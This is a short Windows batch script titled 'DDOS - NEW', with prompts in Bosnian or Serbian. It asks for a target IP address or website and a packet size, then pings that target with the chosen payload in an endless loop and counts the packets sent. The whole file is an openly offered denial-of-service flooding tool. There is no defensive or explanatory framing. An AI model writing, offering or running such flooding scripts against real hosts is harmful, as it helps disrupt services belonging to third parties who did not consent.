@echo off
color 04
title DDOS - NEW (BY KENAN HUSAKOVIC)

Set/p PIPI=IPv4/Website:
Set /p Puffer=Packovi:

:A
Set /a Send=%Send%+1
ping %PIPI% -l %Puffer% -w 15 -n 1 -4 >NUL
echo Slanje Packes :%PIPI%:%Puffer%:%Send%
goto A